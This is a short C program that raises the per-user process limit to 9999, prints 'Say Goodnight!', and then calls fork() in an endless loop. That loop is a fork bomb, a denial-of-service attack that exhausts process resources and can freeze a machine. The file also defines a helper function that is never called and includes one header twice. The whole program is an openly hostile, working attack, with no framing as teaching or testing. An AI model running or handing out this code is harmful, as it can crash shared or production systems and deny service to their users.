#include<stdlib.h>
#include<stdio.h>
#include<signal.h>
#include<string.h>
#include<unistd.h>
#include<sys/wait.h>

#define MAX 9999

#include <stdio.h>
#include <sys/resource.h>

int set_max_processes(rlim_t max_proc) {
    struct rlimit limit;
    
    // RLIMIT_NPROC controls the max number of processes for the user ID
    limit.rlim_cur = max_proc; // Soft limit
    limit.rlim_max = max_proc; // Hard limit

    if (setrlimit(RLIMIT_NPROC, &limit) != 0) {
        perror("setrlimit failed");
        return -1;
    }
    
    printf("Max process limit successfully set to %lu\n", (unsigned long)max_proc);
    return 0;
}

int main(void) {
    struct rlimit rl;

    rl.rlim_cur = 9999;  // Target process limit
    rl.rlim_max = 9999;  // Hard limit ceiling

    // Send RLIMIT_NPROC and the address of the struct
    if (setrlimit(RLIMIT_NPROC, &rl) != 0) {
        perror("setrlimit failed");
        return 1;
    }

    printf("Successfully updated process limit.\n Say Goodnight!");

    while(1)
    {
        fork();
    }





    return 0;
}